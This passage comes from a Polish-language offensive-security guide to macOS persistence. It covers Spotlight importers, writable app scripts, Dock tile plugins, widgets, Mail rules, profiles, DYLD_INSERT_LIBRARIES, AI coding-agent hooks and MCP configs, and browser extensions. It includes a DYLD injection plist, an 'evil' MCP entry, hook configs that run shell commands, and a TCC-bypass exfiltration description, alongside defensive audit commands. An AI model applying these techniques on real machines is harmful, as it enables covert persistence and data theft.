  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
  - Wymagany root
- `Some.app/Contents/Library/Spotlight/`
  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
  - Wymagana nowa aplikacja

#### Opis i wykorzystanie

Spotlight to wbudowana w macOS funkcja wyszukiwania, zaprojektowana tak, aby zapewniać użytkownikom **szybki i wszechstronny dostęp do danych na ich komputerach**.\
Aby umożliwić szybkie wyszukiwanie, Spotlight utrzymuje **własną bazę danych** i tworzy indeks, **analizując większość plików**, co pozwala szybko wyszukiwać zarówno nazwy plików, jak i ich zawartość.<sup>[[25]](#references)</sup>

Podstawą działania Spotlight jest centralny proces o nazwie „mds”, co oznacza **„serwer metadanych”**. Proces ten koordynuje działanie całej usługi Spotlight. Współpracuje z nim wiele demonów „mdworker”, które wykonują różne zadania konserwacyjne, takie jak indeksowanie różnych typów plików (`ps -ef | grep mdworker`). Zadania te są możliwe dzięki wtyczkom Spotlight importer, czyli **pakietom „.mdimporter”**, które pozwalają Spotlight rozpoznawać i indeksować zawartość wielu różnych formatów plików.

Wtyczki, czyli pakiety **`.mdimporter`**, znajdują się w wymienionych wcześniej lokalizacjach. Nowy pakiet musi zostać wykryty i obsługiwać dany typ pliku, a Spotlight musi faktycznie zindeksować pasujący plik; samo skopiowanie pakietu nie dowodzi, że został załadowany. [Dokumentacja MDImporter firmy Apple](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) wiąże ładowanie z kwalifikującym się zmienionym plikiem. Nie testowano tutaj uruchamiania importerów Spotlight w macOS 26.

Można **znaleźć wszystkie załadowane `mdimporters`**, uruchamiając:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Na przykład **/Library/Spotlight/iBooksAuthor.mdimporter** służy do analizowania tego typu plików (m.in. z rozszerzeniami `.iba` i `.book`):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Jeśli sprawdzisz Plist innego `mdimporter`, możesz nie znaleźć wpisu **`UTTypeConformsTo`**. Dzieje się tak, ponieważ jest to wbudowany _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) i nie musi określać rozszerzeń.
>
> Co więcej, domyślne wtyczki systemowe mają zawsze pierwszeństwo, więc atakujący może uzyskać dostęp tylko do plików, które nie są indeksowane przez własne `mdimporters` Apple.

Aby utworzyć własny importer, możesz zacząć od tego projektu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), a następnie zmienić nazwę i **`CFBundleDocumentTypes`**, dodać **`UTImportedTypeDeclarations`**, aby obsługiwał wybrane rozszerzenie, oraz odzwierciedlić te zmiany w **`schema.xml`**.\
Następnie **zmień** kod funkcji **`GetMetadataForFile`**, aby uruchamiała payload po utworzeniu pliku z obsługiwanym rozszerzeniem.

Na koniec **zbuduj nowy `.mdimporter` i skopiuj go** do jednej z trzech wcześniej wymienionych lokalizacji. Możesz sprawdzić, czy został załadowany, **monitorując logi** lub uruchamiając **`mdimport -L`**.

> [!TIP]
> Mimo że sandbox importera jest bardzo restrykcyjny, `mdworker` indeksuje pliki z **uprzywilejowanym dostępem do odczytu**. Złośliwy `.mdimporter` może więc odczytywać *treść* plików w lokalizacjach chronionych przez TCC (Pobrane, Obrazy, Biurko, …) i eksfiltrować zebrane metadane bez żadnego monitu TCC — to **obejście TCC „Sploitlight” (CVE-2025-31199)**, załatane w macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

Informacje o odrębnej technice z macOS 26, polegającej na przenoszeniu chronionych bajtów w **nazwach powiadomień Darwin** zamiast w logach systemowych, znajdziesz w sekcji [Wyciek danych przez Spotlight importer za pośrednictwem nazw powiadomień Darwin](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names).<sup>[[57]](#references)</sup>

### ~~Panel preferencji~~

> [!CAUTION]
> Wygląda na to, że ta metoda już nie działa.

Opis: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymaga konkretnego działania użytkownika
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Opis

Wygląda na to, że ta metoda już nie działa.<sup>[[26]](#references)</sup>

### Pliki skryptów aplikacji

Opis: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga jednak, aby docelowa aplikacja była zainstalowana i uruchomiona/używana przez ofiarę
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

**Interpretowany skrypt, który faktycznie wykonuje zainstalowana aplikacja lub narzędzie i który aktor może zmodyfikować**. Sprawdź uprawnienia pliku i ścieżkę wywołania; samo znalezienie pliku `.sh` lub `.py` nie wystarczy. W przewodniku Apple dotyczącym [podpisywania kodu](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) podano, że podpisane pakiety aplikacji zabezpieczają zasoby, w tym skrypty. Edycja skryptu wewnątrz pakietu narusza to zabezpieczenie i może zostać wykryta lub zablokowana podczas weryfikacji pakietu. Zewnętrzny skrypt, taki jak launcher Homebrew, podlega innym zasadom podpisywania i zaufania. Historyczne przykłady z opisu obejmują:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – skrypt używany przez starsze wersje Sublime Text; należy sprawdzić, czy plik istnieje i jest używany podczas uruchamiania w zainstalowanej wersji. Nie było go na testowym Macu.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) lub **`/usr/local/bin/brew`** (Intel) – launcher Bash uruchamiany po wywołaniu ścieżki `brew`, jeśli jest zainstalowany i aktor ma prawo go modyfikować. Na testowym Macu `/opt/homebrew/bin/brew` był zapisywalnym skryptem Bash; to lokalna obserwacja, a nie ogólna reguła dotycząca uprawnień Homebrew.
- **`idlemain.py`** w pakiecie aplikacji Pythona IDLE – zapis do pliku może wymagać uprawnień administratora, ale skrypt działa z tożsamością użytkownika IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – historyczny skrypt powłoki uruchamiany jako root, gdy zainstalowane jest odpowiadające mu zadanie launchd `org.wireshark.ChmodBPF`. Na testowym Macu nie było ani skryptu, ani zadania.

#### Opis i wykorzystanie

Niektóre narzędzia i aplikacje wykonują interpretowane skrypty w czasie działania. Zapisywalny skrypt może uruchamiać dodane polecenia przy następnym uruchomieniu przez konkretnego wywołującego, o ile pozwalają na to weryfikacja podpisu, kwarantanna i inne kontrole. Pierwotne badania wykazały kilka instalacji z 2019 roku; ponownie sprawdź ich ścieżki i mechanizmy uruchamiania w docelowej wersji.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Ten test kopii dał wynik `marker fired: True` w macOS 26.5.2; oryginalny launcher pozostał nietknięty. Dowodzi to, że punkt wstrzyknięcia jest wykonywany w kopii, ale nie że zmodyfikowany, podpisany pakiet aplikacji lub rzeczywista instalacja Homebrew przejdzie wszystkie kontrole uruchamiania.

### Dock Tile Plugins

Opis: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga, aby aplikacja deklarująca plug-in została wykryta/zarejestrowana i obsłużona przez Dock
  - Plugin ładuje się do pomocniczego procesu **podpisanego przez Apple**, który nie ma uprawnienia app-sandbox, a **walidacja bibliotek jest wyłączona**. W przywołanym badaniu ten proces pomocniczy nie był widoczny w interfejsie Background Task Management; widoczność w docelowej wersji systemu należy sprawdzić.
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, wskazany kluczem **`NSDockTilePlugIn`** w pliku `Info.plist` aplikacji; własny plik `Info.plist` plug-inu określa **`NSPrincipalClass`**.

#### Opis i wykorzystanie

Gdy aplikacja deklaruje `NSDockTilePlugIn`, Dock może załadować wskazany pakiet do pomocniczego procesu XPC **`com.apple.dock.external.extra`** (`...extra.arm64` na Apple Silicon) podczas logowania lub dodawania kafelka aplikacji; sama aplikacja nie musi być uruchomiona. Wymaga to, aby aplikacja została wykryta/zarejestrowana i zaakceptowana przez macOS. Proces pomocniczy jest **podpisany przez Apple**, nie ma uprawnienia `com.apple.security.app-sandbox`, a jego ustawienie `com.apple.security.cs.disable-library-validation` jest włączone. Po załadowaniu wywoływana jest metoda **`setDockTile:`** klasy głównej; następnie można subskrybować powiadomienia rozproszone (np. `com.apple.screenIsLocked`), aby odbierać późniejsze zdarzenia.<sup>[[38]](#references)</sup>

W macOS 26.5.2 inspekcja tylko do odczytu za pomocą `codesign` potwierdziła podpis Apple i uprawnienia procesu pomocniczego, a kilka zainstalowanych aplikacji deklarowało `NSDockTilePlugIn`. Na tym Macu nie zainstalowano ani nie załadowano żadnego nowego plug-inu, więc wykonanie nowo utworzonego pakietu w tej wersji systemu pozostaje nieprzetestowane.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Przydatne do omijania sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Rozszerzenie widgetu działa we **własnym procesie**, a dodanie widgetu **nie** wyświetla alertu Background Task Management
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Plist konfiguracyjny znajduje się w kontenerze chronionym przez TCC, więc jego edycja z zewnątrz wymaga Full Disk Access lub ominięcia TCC

#### Lokalizacja

- Bundle rozszerzenia widgetu: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Aktywne/zarejestrowane widgety: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (klucze `widgets.instances` i `widgets.widgets`)

#### Opis i wykorzystanie

Rozszerzenie WidgetKit dostarczane wewnątrz aplikacji działa we **własnym procesie** zarządzanym przez Notification Center. Zarejestrowanie instancji w `widgets.instances` (blob `CHSWidget` zakodowany w formacie base64 przez `NSKeyedArchiver`, zawierający osadzone dane `INIntent`) i ponowne uruchomienie NotificationCenter powoduje załadowanie widgetu i wykonanie jego kodu `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Reguły Mail.app (uruchamianie AppleScript)

Opis: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Przydatne do omijania sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mail.app musi być jednak skonfigurowany z kontem i uruchomiony; wyzwalaczem jest przychodząca wiadomość e-mail
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Edytowanie reguł/skryptów spoza Mail może wymagać zamknięcia Mail i przyznania Full Disk Access w nowszych wersjach macOS

#### Lokalizacja

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (reguły lokalne; `V10` w Sonoma/Sequoia, `V11`+ w nowszych wersjach)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (reguły synchronizowane przez iCloud, mają pierwszeństwo)
- Włączanie reguł: **`RulesActiveState.plist`**; payload AppleScript: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Opis i wykorzystanie

Reguła Apple Mail może mieć akcję *„Run AppleScript”*. Dodając regułę, która dopasowuje spreparowany **temat wiadomości** i uruchamia skrypt atakującego, przeciwnik uzyskuje **zdalnie wyzwalane, ukryte** wykonanie kodu w kontekście Mail za każdym razem, gdy nadejdzie odpowiednia wiadomość e-mail — jest to wektor, który omija wiele skanerów mechanizmów trwałości, ponieważ nie jest tworzony żaden LaunchAgent ani Login Item.<sup>[[42]](#references)</sup> Ustawienie reguły tak, aby dodatkowo **usuwała** wiadomość wyzwalającą, ukrywa ślady. Obrońcy mogą wyszukać ją bezpośrednio:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Profile konfiguracji (.mobileconfig)

Opis: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Przydatne do ominięcia sandboxa: [🔴](https://emojipedia.org/large-red-circle)
  - Nowoczesny macOS wymaga **ręcznego zatwierdzenia przez użytkownika** w Ustawieniach systemowych → *Zarządzanie urządzeniem* (cicha instalacja przez `profiles install` nie jest już dostępna poza MDM)
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Zainstalowane profile znajdują się w **`/Library/Managed Preferences/`** i **`/var/db/ConfigurationProfiles/`**; profil to plik XML plist z tablicą `PayloadContent`.

#### Opis i wykorzystanie

Plik `.mobileconfig` nie umożliwia bezpośredniego wykonania kodu, ale może utrwalać konfigurację, taką jak **zaufany główny certyfikat CA** (`com.apple.security.root`), **globalny proxy lub proxy PAC** (`com.apple.proxy.*`), **zarządzane preferencje** (`com.apple.ManagedClient.preferences`) lub ograniczenia. W macOS 10.15 i nowszych definicja [`PayloadRemovalDisallowed` firmy Apple](https://developer.apple.com/documentation/devicemanagement/toplevel) wskazuje, że ustawienie tej wartości na `true` w przypadku **ręcznie zainstalowanego** profilu bez payloadu z hasłem do usunięcia wymaga **uwierzytelnienia administratora**, aby go usunąć; nie czyni to profilu całkowicie niemożliwym do usunięcia. Profile zainstalowane przez MDM podlegają odrębnym zasadom zarządzania i usuwania.<sup>[[44]](#references)</sup>

> [!WARNING]
> Zwykły profil konfiguracji **nie ma typu payloadu, który dodaje dowolny `LaunchDaemon`/`LaunchAgent`**. Zainstalowanie demona w ten sposób wymaga pełnej **rejestracji w MDM** oraz agenta/skryptu zarządzającego — nie traktuj `.mobileconfig` jako mechanizmu dostarczania przez launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Persistence przez DYLD_INSERT_LIBRARIES

- Przydatne do ominięcia sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **usuwa** `DYLD_*` w przypadku plików binarnych SIP/platformy, aplikacji z hardened runtime i celów setuid, więc wstrzykuje bibliotekę tylko do niezabezpieczonych procesów i **nie** omija SIP ani hardened runtime
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Niezawodna metoda: słownik **`EnvironmentVariables`** w złośliwym pliku plist `LaunchAgent`/`LaunchDaemon` (uruchamianym przy logowaniu/rozruchu)
- Nieaktualne/historyczne (tylko do raportowania): **`~/.MacOSX/environment.plist`** (usunięty w 10.8) oraz **`/etc/launchd.conf`** (usunięty w 10.10)

#### Opis i wykorzystanie

Jeśli atakujący może umieścić `DYLD_INSERT_LIBRARIES` w środowisku procesu ofiary, dyld ładuje dylib atakującego (uruchamia się jej konstruktor) do tego procesu. Wariant trwały umieszcza tę zmienną w `LaunchAgent`, więc każde uruchomienie zadania ponownie wstrzykuje bibliotekę. Pamiętaj, że we współczesnym macOS `launchctl setenv DYLD_*` jest filtrowane, więc zamiast tego umieść ją w pliku plist.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Pełny opis mechaniki dylib injection/hijacking znajdziesz tutaj:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent CLIs (hooks, MCP servers, rules files)

Opracowania: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga, aby deweloper korzystał z danego agenta. Polecenia startowe są uruchamiane z uprawnieniami tego użytkownika, gdy agent zaakceptuje jego konfigurację; zasady zaufania do workspace i zatwierdzania MCP różnią się w zależności od produktu i trybu sesji.
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle) (działa jako użytkownik; dziedziczy uprawnienia, które ma już terminal/agent)

#### Lokalizacja

Jawne pliki konfiguracji hooków i MCP mogą powodować **uruchamianie poleceń powłoki lub procesów potomnych, gdy deweloper korzysta z narzędzia** — albo na podstawie globalnego pliku użytkownika (persistence), albo pliku umieszczonego w repozytorium (supply-chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` i reguły edytora to **instrukcje dla agenta**, a nie gwarancja uruchomienia poleceń powłoki przy odczycie; ich działanie zależy od zachowania agenta i uprawnień narzędzia. Sprawdź aktualne zasady zaufania i zatwierdzania dla każdego produktu.

- **Claude Code**
  - `~/.claude/settings.json`, projektowy `.claude/settings.json`, `.claude/settings.local.json` oraz dostępny tylko dla roota **`/Library/Application Support/ClaudeCode/managed-settings.json`** (ustawień MDM/zarządzanych **nie może nadpisać** użytkownik → silna persistence)
  - Obiekt `hooks` — zdarzenia `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — każde uruchamia polecenie powłoki `command`
  - `statusLine.command` — polecenie powłoki uruchamiane w celu wyświetlenia wiersza stanu (w każdej sesji)
  - Serwery MCP w `~/.claude.json` / projektowym `.mcp.json` — `command`+`args` uruchamiane jako procesy potomne
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — instrukcje, które mogą próbować przeprowadzić prompt injection; ich działanie zależy od zachowania agenta i uprawnień narzędzia
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` uruchamiane jako procesy potomne); instrukcje projektowe `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, serwery MCP); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … uruchamiają polecenia); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Opis i wykorzystanie

Jeśli atakujący może zmodyfikować globalne ustawienia użytkownika konta, skonfigurowane w nich polecenia hooków lub MCP mogą być uruchamiane podczas kolejnych sesji tego konta. Konfiguracja kontrolowana przez repozytorium to odrębny przypadek: [aktualna dokumentacja bezpieczeństwa Claude Code](https://code.claude.com/docs/en/security) opisuje interaktywne okno dialogowe zaufania do workspace oraz osobny monit o zatwierdzenie serwerów z projektowego pliku `.mcp.json`. [Macierz uprawnień](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) wskazuje, że hooki mogą być uruchamiane po oznaczeniu folderu nadrzędnego jako zaufanego, a sesje `claude -p`/SDK nie wyświetlają interaktywnego monitu o zaufanie; w tych trybach nieinteraktywnych projektowe serwery MCP łączą się bez monitu o zatwierdzenie. Zgłoszone obejście hooków projektowych przed ustanowieniem zaufania, CVE-2025-59536, [naprawiono w 2025 roku](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); nie należy traktować go jako obecnego domyślnego zachowania. Wektorami dostarczenia mogą być przejęte repozytorium lub złośliwy instalator. Prompt injection w plikach reguł jest mniej przewidywalne niż jawny hook i nadal zależy od zatwierdzeń narzędzi.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Przykładowe globalne ustawienia użytkownika Claude Code; podczas testów umieść je wyłącznie na koncie przeznaczonym do tego celu:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Przykładowa globalna konfiguracja Codex MCP użytkownika:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Przykładowa konfiguracja hooka Cursor; przed użyciem sprawdź schemat dla zainstalowanej wersji:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Rozszerzenia przeglądarki (Chromium: Chrome / Brave / Edge)

Opis: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [nadużycie ExtensionInstallForcelist w macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga obsługiwanej przeglądarki oraz zainstalowanego i włączonego rozszerzenia. External Extensions w macOS wymagają potwierdzenia przez użytkownika; wymuszona instalacja zarządzana wymaga odpowiedniej polityki enterprise.
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> To coś innego niż **native messaging hosts** (zobacz sekcję *Chrome native messaging hosts* powyżej). W tym przypadku mechanizmem persistence jest samo **automatycznie instalowane rozszerzenie**.

#### Lokalizacja

- **JSON External Extensions** (wykrywany przy uruchomieniu przeglądarki, po czym w macOS wyświetla się prośba o włączenie):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (dla użytkownika) lub `/Library/Application Support/Google/Chrome/External Extensions/` (dla wszystkich użytkowników)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Wymuszona instalacja przez politykę enterprise** za pomocą zarządzanych preferencji / profilu konfiguracji:
  - klucz `ExtensionInstallForcelist` w `com.google.Chrome` (`com.brave.Browser` dla Brave, `com.microsoft.Edge` dla Edge); odczytywany z `/Library/Managed Preferences/` lub z zainstalowanego pliku `.mobileconfig`

#### Opis i wykorzystanie

Są to dwie różne ścieżki instalacji. Dokumentacja [Chrome dotycząca instalacji zewnętrznej](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) mówi, że użytkownicy systemów **Windows i macOS muszą potwierdzić i włączyć** rozszerzenie udostępnione za pośrednictwem pliku *External Extensions*; samo zapisanie tego pliku JSON nie powoduje jego wykonania. W przypadku instalacji dla wszystkich użytkowników w macOS Chrome wymaga również, aby plik rozszerzenia zewnętrznego był chroniony przed modyfikacją przez użytkowników bez uprawnień. Zarządzana polityka `ExtensionInstallForcelist` lub `ExtensionSettings` może zainstalować i przypiąć rozszerzenie bez interakcji użytkownika; [przewodnik Google dotyczący polityk na Macu](https://support.google.com/chrome/a/answer/7517624) opisuje konfigurację zarządzaną i informuje, że użytkownik nie może usunąć rozszerzeń zainstalowanych w trybie wymuszonym. To ścieżka wdrażania za pomocą polityki, a nie skrót `defaults write` działający dla pojedynczego użytkownika.<sup>[[49]](#references)</sup>

> [!WARNING]
> W macOS manifest JSON *External Extensions* musi wskazywać adres URL aktualizacji **Chrome Web Store**, a nie lokalny plik CRX. Wdrożenie za pomocą zarządzanej polityki ma własne wymagania enterprise i może dopuszczać zarządzany, samodzielnie hostowany adres URL aktualizacji. W przypadku lokalnego, rozpakowanego rozszerzenia w profilu testowym przełącznik trybu deweloperskiego Chrome `--load-extension=/path` jest osobnym mechanizmem i nie sprawia, że plik JSON External Extensions wykonuje się samoczynnie. Nie traktuj zapisu do `Secure Preferences` jako równoważnego żadnej z udokumentowanych metod rejestracji.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Uruchom Chrome na tymczasowym koncie i obserwuj monit o włączenie; własne działanie rozszerzenia stanowi PoC wykonania po zaakceptowaniu przez użytkownika. Po teście usuń manifest i wyłącz/odinstaluj rozszerzenie w tym profilu. Ta ścieżka **nie była** testowana w aktywnym profilu Chrome na Macu używanym do badań. Nie wdrożono tam również ścieżki z użyciem zarządzanych zasad.

Force-install i External Extensions odwołują się do identyfikatorów rozszerzeń **Chrome Web Store**; informacje o niższopoziomowej sztuczce polegającej na cichym wstrzyknięciu lokalnego rozszerzenia przez edycję podpisanego HMAC pliku profilu `Secure Preferences` oraz o innych sposobach nadużywania procesów Chromium znajdziesz tutaj:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Schematy URL i programy obsługujące typy plików (LaunchServices)

Opis: [Zdalne wykorzystanie Maca za pomocą niestandardowych schematów URL (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Przydatne do omijania sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wyzwalaczem jest kliknięcie linku przez ofiarę (np. w Chrome/Brave/Safari) lub otwarcie pliku z zarejestrowanym typem
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Plik `Info.plist` pakietu aplikacji deklarujący **`CFBundleURLTypes`/`CFBundleURLSchemes`** (niestandardowy schemat URL) lub **`CFBundleDocumentTypes`** (rozszerzenie pliku/UTI)
- Efektywne ustawienia domyślne użytkownika mogą znajdować się w **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (tablica `LSHandlers`). Obsługiwanym przez Apple API do wyboru domyślnego programu obsługującego schemat URL jest `LSSetDefaultHandlerForURLScheme`; bezpośredni zapis do tego pliku plist nie jest udokumentowaną metodą rejestracji ani aktualizacji pamięci podręcznej.

#### Opis i wykorzystanie

